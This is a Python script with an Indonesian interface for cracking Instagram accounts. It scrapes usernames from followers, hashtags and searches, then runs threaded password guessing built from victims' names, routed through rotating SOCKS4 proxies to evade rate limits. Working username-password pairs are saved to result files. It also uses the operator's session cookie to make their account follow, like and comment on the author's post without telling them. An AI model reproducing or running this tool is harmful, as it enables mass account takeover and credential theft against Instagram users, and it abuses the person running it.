import os, re, sys, time, json, random, requests
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from time import sleep

# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')

# Logo
___logo___ = (f"""{H} ___ ___ ___ __  __ ___ _   _ __  __
{H}| _ \ _ \ __|  \/  |_ _| | | |  \/  |
{B}|  _/   / _|| |\/| || || |_| | |\/| |
{B}|_| |_|_\___|_|  |_|___|\___/|_|  |_|
{K}[{P}•{K}]{P}——————————————————————————————
{H}[{P}>{H}]{P} Ig : okamahendraa__
{K}[{P}•{K}]{P}——————————————————————————————
""")
# Login Cookie
def ___login___():
    os.system('clear')
    print(___logo___)
    print(f"{B}[{P}•{B}]{P} Masukan Cookie Instagram{M}[{P}Open{M}]{P}\n")
    ___cookie = input(f"{H}[{P}?{H}]{P} Cookie :{K} ")
    if ___cookie in ['open', 'Open', 'OPEN']:
        print(f"{K}[{P}!{K}]{P} Anda Akan Diarahkan Ke Youtube, Silahkan Ikuti Cara Untuk Mendapatkan Cookie...");sleep(3);os.system('xdg-open https://youtu.be/u17ZQgSs3aY');exit()
    elif ___cookie in ['', ' ']:
        exit(f"{P}[{M}!{P}]{M} Jangan Kosong")
    else:
        try:
            ___userid = re.search('ds_user_id=(.*?);', ___cookie);open('Data/user.txt', 'w').write(___userid.group(1))
            ___roz = requests.get(f'https://i.instagram.com/api/v1/users/{___userid.group(1)}/info/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': ___cookie}).json()['user'];open('Data/coki.txt', 'w').write(___cookie)
            print(f"{H}[{P}*{H}]{P} Welcome :{K} {___roz['full_name']}");___follow___()
        except (AttributeError, KeyError):
            exit(f"{P}[{M}!{P}]{M} Pastikan Cookie Sudah Benar")
        except (ConnectionError):
            exit(f"{P}[{K}!{P}]{K} Koneksi Error")
# Follow Cookie
def ___follow___():
    try:
        ___cookie = open('Data/coki.txt', 'r').read()
        ___session = re.search('sessionid=(.*?);', ___cookie)
        ___teks = random.choice(['Hallo Bang 😍','Hai Bang Apa Kabar 😎','Izin Pake Scriptnya 😁','Mantap Bang 😘','Programmer Bang 🤔','Salam Kenal Bang 🤗','I Love You ❤️'])
        ___data = {'comment_text': ___teks,'replied_to_comment_id':''}
        with requests.Session() as ses:
            ___like = ses.post('https://www.instagram.com/web/likes/2734317205115382629/like/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}).text # Jangan Di Ubah!
            ___follow = ses.post('https://www.instagram.com/web/friendships/5398218083/follow/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}).text # Jangan Di Ubah!
            ___komen = ses.post('https://www.instagram.com/web/comments/2734317205115382629/add/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}, data = ___data).text #Jangan Di ubah!
            if '"status":"ok"' in str(___follow):
                print(f"{H}[{P}!{H}]{P} Login Berhasil");___menu___()
            else:
                print(f"{P}[{M}!{P}]{M} Cookie Invalid");sleep(3);os.system('rm -rf Data/coki.txt');___login___()
    except Exception as e:
        print(f"{P}[{M}!{P}]{M} Cookie Invalid");sleep(3);os.system('rm -rf Data/coki.txt');___login___()
# Menu
def ___menu___():
    try:
        os.system('clear')
        print(___logo___)
        ___roz = requests.get(f'https://i.instagram.com/api/v1/users/{open("Data/user.txt","r").read()}/info/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['user']
        print(f"{B}[{P}*{B}]{P} Welcome :{K} {___roz['full_name']}")
        print(f"{B}[{P}*{B}]{P} User :{K} {___roz['username']}")
        print(f"{B}[{P}*{B}]{P} Follower :{K} {___roz['follower_count']}\n")
    except (IOError):
        print(f"{P}[{M}!{P}]{M} Cookie Invalid");sleep(3);___login___()
    except (KeyError):
        print(f"{P}[{M}!{P}]{M} Cookie Invalid");os.system('rm -rf Data/coki.txt && rm -rf Data/user.txt');sleep(3);___login___()
    except (IOError):
        exit(f"{P}[{K}!{P}]{K} Koneksi Error")
    print(f"{B}[{P}1{B}]{H} Crack Username Dari Mengikuti")
    print(f"{B}[{P}2{B}]{H} Crack Username Dari Pengikut")
    print(f"{B}[{P}3{B}]{H} Crack Username Dari Activity")
    print(f"{B}[{P}4{B}]{H} Crack Username Dari Beranda")
    print(f"{B}[{P}5{B}]{H} Crack Username Dari Hastag")
    print(f"{B}[{P}6{B}]{H} Crack Username Dari Search")
    print(f"{B}[{P}7{B}]{H} Crack Username Dari No Hp")
    print(f"{B}[{P}8{B}]{H} Crack User Dari Email")
    print(f"{B}[{P}9{B}]{H} Mulai Crack {P}[{H}Fast{P}]{H}")
    print(f"{B}[{P}0{B}]{H} Lihat Hasil Crack")
    print(f"{B}[{P}A{B}]{H} Keluar {P}[{M}Exit{P}]{M}\n")
    ___pilih = input(f"{H}[{P}?{H}]{P} Pilih :{K} ")
    if ___pilih in ['1','01']:
        ___mengikuti___()
    elif ___pilih in ['2','02']:
        ___pengikut___()
    elif ___pilih in ['3','03']:
        ___activity___()
    elif ___pilih in ['4','04']:
        ___beranda___()
    elif ___pilih in ['5','05']:
        ___hastag___()
    elif ___pilih in ['6','06']:
        ___search___()
    elif ___pilih in ['7','07']:
        ___query___()
    elif ___pilih in ['8','08']:
        ___email___()
    elif ___pilih in ['9','09']:
        ___proxy___()
    elif ___pilih in ['0','00']:
        try:
            print(f"\n{H}[{P}1{H}]{P} Lihat Hasil Ok")
            print(f"{H}[{P}2{H}]{P} Lihat Hasil Cp")
            print(f"{H}[{P}3{H}]{P} Kembali\n")
            ___hasil = input(f"{B}[{P}?{B}]{P} Pilih :{K} ")
            if ___hasil in ['1','01']:
                print(f"{P} ");os.system('cat Results/Ok.txt')
            elif ___hasil in ['2','02']:
                print(f"{P} ");os.system('cat Results/Cp.txt')
            elif ___hasil in ['3','03']:
                ___menu___()
            else:
                exit(f"{P}[{M}!{P}]{M} Wrong Input")
        except:pass
    elif ___pilih in ['a','A']:
        print(f"{P}[{K}!{P}]{K} Menghapus Cookie...");os.system('rm -rf Data/coki.txt && rm -rf Data/user.txt');exit()
    else:
        exit(f"{P}[{K}!{P}]{M} Wrong Input")
# Dump Mengikuti
def ___mengikuti___():
    try:
        ___user = input(f"\n{H}[{P}?{H}]{P} User :{K} ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            exit(f"{P}[{M}!{P}]{M} Gunakan Username")
        else:
            ___roz = requests.get(f'https://www.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
            print(f"{H}[{P}?{H}]{P} Name :{K} {___roz['full_name']}\n")
            ___file = (___roz['full_name'].replace(' ','_')+'.txt')
        with requests.Session() as ses:
            ___zak = ses.get(f'https://i.instagram.com/api/v1/friendships/{___roz["id"]}/following/?count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___zak['users']:
                open('Dump/'+___file, 'a').write(z['username']+'<=>'+z['full_name']+'\n')
                print(f"{P}{z['username']}<=>{z['full_name']}")
            print(f"\n{B}[{P}*{B}]{P} Selesai...")
            print(f"{B}[{P}?{B}]{P} File Tersimpan Di :{K} Dump/{___file}")
            input(f"{M}[{P}Kembali{M}]{P}");___menu___()
    except (KeyError):
        exit(f"{P}[{M}!{P}]{M} Dump Gagal")
    except (ConnectionError):
        exit(f"{P}[{M}!{P}]{M} Koneksi Error")
# Dump Pengikut
def ___pengikut___():
    try:
        ___user = input(f"\n{H}[{P}?{H}]{P} User :{K} ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            exit(f"{P}[{M}!{P}]{M} Gunakan Username")
        else:
            ___roz = requests.get(f'https://www.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
            print(f"{H}[{P}?{H}]{P} Name :{K} {___roz['full_name']}\n")
            ___file = (___roz['full_name'].replace(' ','_')+'.txt')
        with requests.Session() as ses:
            ___zak = ses.get(f'https://i.instagram.com/api/v1/friendships/{___roz["id"]}/followers/?count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___zak['users']:
                open('Dump/'+___file, 'a').write(z['username']+'<=>'+z['full_name']+'\n')
                print(f"{P}{z['username']}<=>{z['full_name']}")
            print(f"\n{B}[{P}*{B}]{P} Selesai...")
            print(f"{B}[{P}?{B}]{P} File Tersimpan Di :{K} Dump/{___file}")
            input(f"{M}[{P}Kembali{M}]{P}");___menu___()
    except (KeyError):
        exit(f"{P}[{M}!{P}]{M} Dump Gagal")
    except (ConnectionError):
        exit(f"{P}[{K}!{P}]{K} Koneksi Error")
# Dump Activity
def ___activity___():
    try:
        ___file = input(f"\n{H}[{P}?{H}]{P} Nama File :{K} ").replace(' ','_')
        if ___file in ['',' ']:
            exit(f"{P}[{M}!{P}]{M} Jangan Kosong")
        else:
            print(f"{P} ")
            ___roz = requests.get('https://www.instagram.com/accounts/activity/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()})
            ___zak = re.findall('"username":"(.*?)","full_name":"(.*?)",', ___roz.text)
            for z in ___zak:
                open('Dump/'+___file, 'a').write(z[0]+'<=>'+z[1]+'\n')
                print(f"{z[0]}<=>{z[1]}")
            print(f"\n{B}[{P}*{B}]{P} Selesai...")
            print(f"{B}[{P}?{B}]{P} File Tersimpan Di :{K} Dump/{___file}")
            input(f"{M}[{P}Kembali{M}]{P}");___menu___()
    except Exception as e:
        exit(f"{P}[{M}!{P}]{M} {e}")
# Dump Beranda
def ___beranda___():
    try:
        ___file = input(f"\n{H}[{P}?{H}]{P} Nama File :{K} ").replace(' ','_')
        if ___file in ['',' ']:
            exit(f"{P}[{M}!{P}]{M} Jangan Kosong")
        else:
            print(f"{P} ")
            ___roz = requests.get('https://i.instagram.com/api/v1/feed/reels_tray/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___roz['tray']:
                open('Dump/'+___file, 'a').write(z['user']['username']+'<=>'+z['user']['full_name']+'\n')
                print(f"{z['user']['username']}<=>{z['user']['full_name']}")
            print(f"\n{B}[{P}*{B}]{P} Selesai...")
            print(f"{B}[{P}?{B}]{P} File Tersimpan Di :{K} Dump/{___file}")
            input(f"{M}[{P}Kembali{M}]{P}");___menu___()
    except (KeyError):
        exit(f"{P}[{M}!{P}]{M} Dump Gagal")
    except (ConnectionError):
        exit(f"{P}[{M}!{P}]{M} Koneksi Error")
# Dump Hastag
def ___hastag___():
    try:
        ___tag = input(f"\n{H}[{P}?{H}]{P} Hastag :{K} ").replace('#','')
        if ___tag in ['',' ']:
            exit(f"{P}[{M}!{P}]{M} Jangan Kosong")
        ___file = input(f"{H}[{P}?{H}]{P} Nama File :{K} ").replace(' ','_')
        if ___file in ['',' ']:
            exit(f"{P}[{M}!{P}]{M} Jangan Kosong")
        else:
            print(f"{P} ")
            ___roz = requests.get(f'https://www.instagram.com/explore/tags/{___tag}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()})
            ___zak = re.findall('"username":"(.*?)","full_name":"(.*?)",', ___roz.text)
            for z in ___zak:
                open('Dump/'+___file, 'a').write(z[0]+'<=>'+z[1]+'\n')
                print(f"{z[0]}<=>{z[1]}")
            print(f"\n{B}[{P}*{B}]{P} Selesai...")
            print(f"{B}[{P}?{B}]{P} File Tersimpan Di :{K} Dump/{___file}")
            input(f"{M}[{P}Kembali{M}]{P}");___menu___()
    except Exception as e:
        exit(f"{P}[{M}!{P}]{M} {e}")
# Dump Search
def ___search___():
    try:
        ___user = input(f"\n{H}[{P}?{H}]{P} User :{K} ")
        if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
            exit(f"{P}[{M}!{P}]{M} Gunakan Username")
        else:
            ___roz = requests.get(f'https://www.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
            print(f"{H}[{P}?{H}]{P} Name :{K} {___roz['full_name']}\n")
            ___file = (___roz['full_name'].replace(' ','_')+'.txt')
        with requests.Session() as ses:
            ___zak = ses.get(f'https://i.instagram.com/api/v1/fbsearch/accounts_recs/?target_user_id={___roz["id"]}&include_friendship_status=true', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___zak['users']:
                open('Dump/'+___file, 'a').write(z['username']+'<=>'+z['full_name']+'\n')
                print(f"{P}{z['username']}<=>{z['full_name']}")
            print(f"\n{H}[{P}*{H}]{P} Selesai...")
            print(f"{H}[{P}?{H}]{P} File Tersimpan Di :{K} Dump/{___file}")
            input(f"{M}[{P}Kembali{M}]{P}");___menu___()
    except (KeyError):
        exit(f"{P}[{M}!{P}]{M} Dump Gagal")
    except (ConnectionError):
        exit(f"{P}[{K}!{P}]{K} Koneksi Error")
# Dump Query
def ___query___():
    try:
        ___query = input(f"\n{H}[{P}?{H}]{P} Query :{K} ")
        if ___query in ['',' ']:
            exit(f"{P}[{M}!{P}]{M} Jangan Kosong")
        else:
            print(f"{P} ")
            ___file = ___query.replace(' ','_')+'.txt'
            ___roz = requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={___query}&rank_token=0.3953592318270893&count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
            for z in ___roz['users']:
                open('Dump/'+___file, 'a').write(z['user']['username']+'<=>'+z['user']['full_name']+'\n')
                print(f"{z['user']['username']}<=>{z['user']['full_name']}")
            print(f"\n{B}[{P}*{B}]{P} Selesai...")
            print(f"{B}[{P}?{B}]{P} File Tersimpan Di :{K} Dump/{___file}")
            input(f"{M}[{P}Kembali{M}]{P}");___menu___()
    except (KeyError):
        exit(f"{P}[{M}!{P}]{M} Dump Gagal")
    except (ConnectionError):
        exit(f"{P}[{K}!{P}]{K} Koneksi Error")
# Dump Dari Email
def ___email___():
    try:
        ___nama = input(f"\n{H}[{P}?{H}]{P} Nama :{K} ").replace(' ','')
        if ___nama in ['',' ']:
            exit(f"{P}[{M}!{P}]{M} Jangan Kosong")
        ___domain = input(f"{H}[{P}?{H}]{P} Domain :{K} ")
        if ___domain in ['@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com']:
            ___limit = int(input(f"{H}[{P}?{H}]{P} Limit :{K} "))
            if ___limit >=1001:
                exit(f"{P}[{M}!{P}]{M} Maksimal 1000")
            else:
                print(f"{P} ")
                ___file = 'Dump/'+___nama+'.txt'
                for _ in range(___limit):
                    ___nomor = random.randint(1, 999)
                    ___user = ___nama + str(___nomor) + ___domain + '<=>' + ___nama + ' ' + str(___nomor)
                    open(___file, 'a').write(f'{___user}\n')
                    print(f"{___user}")
                print(f"\n{B}[{P}*{B}]{P} Selesai...")
                print(f"{B}[{P}?{B}]{P} File Tersimpan Di :{K} {___file}")
                input(f"{M}[{P}Kembali{M}]{P}");___menu___()
        else:
            exit(f"{P}[{M}!{P}]{M} Domain '@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com'")
    except Exception as e:
        exit(f"{P}[{M}!{P}]{M} {e}")
# Proxy
def ___proxy___():
    try:
        ___roz = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
        open('Data/proxy.txt', 'w').write(___roz)
    except Exception as e:
        ___roz = requests.get('https://raw.githubusercontent.com/RozhakXD/Premium/main/Data/proxy2.txt').text
        open('Data/proxy.txt', 'w').write(___roz)
    ___crack___()
# Crack
class ___crack___:
    
    def __init__(self):
        self.kill = 0
        self.ok = []
        self.cp = []
        print(f"\n{H}[{P}1{H}]{P} Gunakan Password {H}[{K}nama, nama123, nama12345{H}]{K}")
        print(f"{H}[{P}2{H}]{P} Gunakan Password {H}[{K}nama, nama123, nama1234, nama12345{H}]{K}")
        print(f"{H}[{P}3{H}]{P} Gunakan Password {H}[{K}nama, nama123, nama1234, nama12345, nama123456, @@nama123, @@nama123456, @@nama12345, jakarta123, jakarta12345, jakarta123456, bali123, bali12345, instagram123, instagram12345, password123, password12345, newpassword, medan123, yogyakarta123{H}]{K}")
        print(f"{H}[{P}4{H}]{P} Gunakan Password Manual {H}[{K}>5{H}]{K}\n")
        ___pilih = input(f"{B}[{P}?{B}]{P} Pilih :{H} ")
        if ___pilih in ['4','04']:
            pwx = input(f"{B}[{P}?{B}]{P} Password :{H} ").split(',')
        try:
            self.___dump = input(f"{B}[{P}?{B}]{P} File Dump :{H} ")
            self.___file = open(self.___dump, 'r').read().splitlines()
        except (IOError):
            exit(f"{P}[{M}!{P}]{M} File Tidak Ada")
        try:
            print(f"\n{H}[{P}•{H}]{P} Hasil Ok Tersimpan Di Results/Ok.txt")
            print(f"{H}[{P}•{H}]{P} Hasil Cp Tersimpan Di Results/Cp.txt\n")
            with ThreadPoolExecutor(max_workers=30) as (___hayuk):
                for ___user in self.___file:
                    username, nama = ___user.split('<=>')
                    z = nama.split(' ')
                    if ___pilih in ['1','01']:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'12345']
                    elif ___pilih in ['2','02']:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'1234', z[0]+'12345']
                    elif ___pilih in ['3','03']:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'1234', z[0]+'12345', z[0]+'123456']
                    elif ___pilih in ['4','04']:
                        password = pwx
                    else:
                        password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'1234', z[0]+'12345']
                    ___hayuk.submit(self.__main__, self.___file, username, password)
            exit(f"\n{M}[{P}Selesai{M}]{P}")
        except (ValueError):
            exit(f"{P}[{M}!{P}]{M} Crack Selesai Sepertinya Ada Yang Error Silahkan Dump Ulang!")
    def __main__(self, user, uid, pwx):
        try:
            ___useragent = open('Data/ua.txt', 'r').read()
        except (IOError):
            ___useragent = ('Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36')
        try:
            for pw in pwx:
                pw = pw.lower()
                ___url = ('https://www.instagram.com/')
                ___login = ('https://www.instagram.com/accounts/login/ajax/')
                ___proxy = {'http': 'socks4://%s'%(random.choice(open("Data/proxy.txt","r").read().splitlines()))}
                ___csrf = requests.get(___url).cookies['csrftoken']
                ___data = {'username': uid,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pw}',
                'queryParams': {},
                'optIntoOneTap': 'false'}
                ___head = {'User-Agent': random.choice(open("Data/ua.txt","r").read().splitlines()),
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/accounts/login/',
                'x-csrftoken': ___csrf}
                with requests.Session() as ses:
                    response = ses.post(___login, data = ___data, headers = ___head, proxies = ___proxy).json()
                    if 'userId' in str(response):
                        coki = (f'mid={ses.cookies.get_dict()["mid"]};ig_did={ses.cookies.get_dict()["ig_did"]};ig_nrcb=1;shbid="9776\0541986587953\0541674289809:01f713acdf5c4921a542aff43695805d8e788f5580f4efaaf714ca7301ba34bb727790c9";shbts="1642753809\0541986587953\0541674289809:01f7227f6219fb0a036e3593c1531e9b9c9eb1db9dcbb7b4590ba36ffcbe62715eb10ada";csrftoken={ses.cookies.get_dict()["csrftoken"]};ds_user_id={ses.cookies.get_dict()["ds_user_id"]};sessionid={ses.cookies.get_dict()["sessionid"]};rur="EAG\0541986587953\0541674477820:01f724c03ff38f24662b1648dd2a933fc4a6e66b7a2bef2458d140bfb76ee86296f6cd8b"')
                        try:
                            ___roz = requests.get(f'https://www.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
                            follower = ___roz['edge_followed_by']['count']
                            following = ___roz['edge_follow']['count']
                        except (KeyError, IOError):
                            follower = ('-')
                            following = ('-')
                        except:pass
                        print(f"\r{B}[{P}✔{B}]{P} Status :{H} Success     ")
                        print(f"{B}[{P}>{B}]{P} Username :{H} {uid}")
                        print(f"{B}[{P}>{B}]{P} Password :{H} {pw}")
                        print(f"{B}[{P}>{B}]{P} Follower :{H} {follower}")
                        print(f"{B}[{P}>{B}]{P} Following :{H} {following}")
                        self.ok.append(f"{uid}|{pw}")
                        open('Results/Ok.txt','a').write(f"{uid}|{pw}\n")
                        break
                    elif 'checkpoint_required' in str(response):
                        try:
                            ___roz = requests.get(f'https://www.instagram.com/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
                            follower = ___roz['edge_followed_by']['count']
                            following = ___roz['edge_follow']['count']
                        except (KeyError, IOError):
                            follower = ('-')
                            following = ('-')
                        except:pass
                        print(f"\r{B}[{P}✘{B}]{P} Status :{K} Checkpoint    ")
                        print(f"{B}[{P}>{B}]{P} Username :{K} {uid}")
                        print(f"{B}[{P}>{B}]{P} Password :{K} {pw}")
                        print(f"{B}[{P}>{B}]{P} Follower :{K} {follower}")
                        print(f"{B}[{P}>{B}]{P} Following :{K} {following}\n")
                        self.cp.append(f"{uid}|{pw}")
                        open('Results/Cp.txt','a').write(f"{uid}|{pw}\n")
                        break
                    elif 'Please wait' in str(response):
                        print(f"{P}[{M}!{P}]{M} Gunakan Mode Pesawat 2 Detik", end='\r');sleep(7);__main__(self, user, uid, pwx)
                    else:
                        continue
            self.kill +=1
            print(f"{P}[{P}Crack{P}]{P} {self.kill}/{str(len(user))} Cp:-{len(self.cp)} Ok:-{len(self.ok)}          ", end='\r')
        except (ConnectionError):
            print(f"{P}[{K}!{P}]{K} Koneksi Error               ", end='\r');sleep(7);__main__(self, user, uid, pwx)
        except:__main__(self, user, uid, pwx)

if __name__=='__main__':
    os.system('git pull')
    ___menu___()
